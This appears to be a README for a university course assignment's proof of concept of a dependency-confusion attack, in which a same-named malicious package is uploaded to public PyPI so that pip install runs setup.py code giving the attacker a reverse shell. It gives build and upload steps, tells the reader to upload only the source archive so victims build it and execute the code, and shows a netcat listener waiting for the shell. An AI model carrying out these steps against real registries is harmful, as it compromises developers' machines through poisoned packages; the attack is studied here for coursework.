# Explanation:

It's important to be aware that packages installation via `pip install` command have the ability to execute python code as part of the install process. For CMPT785 course assignment2 poc usage - requirements.txt has `--extra-index-url` to point to private registry but pip install will check Pypi first. By uploading malicious package with the same name in Pypi, program will download the malicious version and pip install can give a reverse shell to the attacker.



### Build the package:

1. Install the package build process dependencies

​	`python -m pip install --user --upgrade setuptools wheel twine`

2. cd to the directory of setup.py, use this command to build the package

​	`python setup.py sdist bdist_wheel`

3. After build, remember either remove the `.whl` file from `/dist` folder or during the upload process, only upload the `.tar.xz` one. The reason is that we want victims' to build the package themselves in order to get the malicious code execute on victims' machine.  

​	`twine upload dist/*.tar.xz`

4. It will prompt you to enter your username and password in Pypi.org



### Simulate the attack:

Two terminal windows. (If two machines, change the code in setup.py)

Attacker: Listen on 1234 port with netcat`nc -lvp 1234`

Victim: Execute pip install command`pip install much_needed_py_package`

We can see in attacker's window, a reverse shell is estatblished.

![CleanShot 2023-04-08 at 23 18 14](https://user-images.githubusercontent.com/26541990/230758877-3ee9c521-3490-485d-b389-1d543e7c1719.png)

